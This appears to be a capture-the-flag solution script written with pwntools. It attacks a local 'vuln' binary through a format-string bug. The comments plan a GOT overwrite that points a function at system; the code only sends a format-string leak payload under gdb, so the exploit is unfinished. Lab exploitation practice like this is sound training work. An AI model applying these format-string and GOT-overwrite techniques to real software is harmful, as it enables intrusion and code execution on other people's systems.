# Solution
# 
# Partial RELRO is set, so should be able to perform a GOT overwrite
# Similar to the stonks challenge, this challenge is vulnerable to a format string attack


# 602038 <- address for the got.plt function
#   should set the value located there to the thunk function for system
# 0x602038 => 20306000_00000000 => 00000000_00603020
#   set to => 18306000_00000000 <= 00000000_00603018
# 
# Ez enough
# Set 0x602038 0x20 => 0x18

from pwn import *

def main():
  proc = process('./vuln')
  context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
  gdb.attach(proc)
  sleep(5)

  buff = b'%x-' * 1000
  payload = b''.join([
    buff
  ])

  proc.sendlineafter(b'2) View my portfolio', b'1')
  proc.sendlineafter(b'What is your API token?', payload)
  proc.recvline()
  proc.interactive()

if __name__ == '__main__':
  main()
